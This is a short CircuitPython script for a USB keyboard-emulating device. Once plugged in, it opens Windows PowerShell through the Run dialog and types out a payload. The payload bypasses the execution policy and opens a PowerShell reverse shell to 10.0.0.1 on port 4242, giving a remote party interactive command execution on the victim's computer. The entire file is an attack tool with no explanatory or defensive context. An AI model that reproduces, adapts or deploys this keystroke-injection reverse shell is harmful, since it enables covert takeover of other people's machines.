import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_US import KeyboardLayoutUS

time.sleep(3)

payload = ["set-ExecutionPolicy -executionPolicy Bypass -Scope Process -Force; iex( New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535 |%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close())"]


kb = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kb)

kb.send(Keycode.GUI, Keycode.R)
time.sleep(0.25)
layout.write('powershell')

kb.send(Keycode.ENTER)

time.sleep(0.5)

for line in payload:
    layout.write(line)
    kb.send(Keycode.ENTER)
